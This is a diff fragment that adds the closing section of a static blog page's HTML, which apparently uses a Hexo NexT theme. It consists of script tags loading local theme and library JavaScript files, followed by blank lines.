+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
